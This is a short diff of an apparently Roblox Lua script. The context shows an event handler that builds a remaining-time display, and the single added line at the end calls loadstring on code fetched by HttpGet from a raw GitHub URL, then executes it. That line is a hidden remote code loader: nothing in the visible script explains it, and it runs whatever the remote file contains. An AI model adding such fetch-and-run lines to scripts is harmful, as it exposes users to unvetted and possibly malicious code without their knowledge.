@@ -1368,3 +1368,4 @@ workspace.DescendantAdded:Connect(function(descendant)
         createBeautifulPurpleRemainingTime()
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/DIBIL193939/refs/heads/main/nerabotaet.lua"))()
